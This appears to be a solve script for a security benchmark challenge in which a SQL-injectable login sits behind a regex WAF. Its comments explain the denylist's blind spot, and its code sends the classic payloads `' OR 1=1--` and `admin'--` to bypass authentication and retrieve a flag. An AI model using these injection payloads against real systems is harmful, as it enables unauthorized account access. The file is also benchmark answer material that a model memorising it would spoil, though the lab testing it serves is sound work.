#!/usr/bin/env bash
# APEX-058-25 — "DefenseMatrix Evasion" (tags: waf_bypass, blind_sqli, chunked_te)
#
# The login concatenates its username into SQL and a WAF stands in front with a
# list of twenty-odd regular expressions. The benchmark's intended bypass is a
# chunked request whose payload straddles two chunks, and it cannot work here:
# Node reassembles a chunked body before any of this code sees it, so the WAF's
# attempt to split the framing back out finds nothing to split and inspects the
# whole payload. Sending it that way is refused.
#
# What the list does not contain is the oldest injection there is. Every pattern
# matches a clause — `OR 1=1`, `SELECT … FROM`, `UNION SELECT` — and a username
# of `admin'--` contains no clause at all: it closes the string and comments the
# password check away. Nothing in the request looks like SQL, and the query it
# produces is `WHERE username = 'admin'`.
#
# A denylist is a list of the attacks somebody thought of.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
. "$(dirname "$0")/lib.sh"
SESSION="apex058-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null

# Refused, to show the WAF is doing its job on what it knows.
send "$SESSION" req_0 --create \
    --set method=POST --set path=/api/admin/login \
    --set header.Content-Type=application/json \
    --set "json.username=' OR 1=1--" --set json.password=x |
    python3 -c '
import re, sys
print("the WAF answered", re.search(r"\d{3}", sys.stdin.readline()).group(0),
      file=sys.stderr)
'

TOKEN="$(send "$SESSION" req_0 --create \
    --set method=POST --set path=/api/admin/login \
    --set header.Content-Type=application/json \
    --set "json.username=admin'--" --set json.password=x |
    body | python3 -c 'import json,sys; print(json.load(sys.stdin)["session_token"])')"

send "$SESSION" req_0 --create \
    --set path=/admin-api/secrets/flag \
    --set "header.X-Admin-Session=$TOKEN" | flag
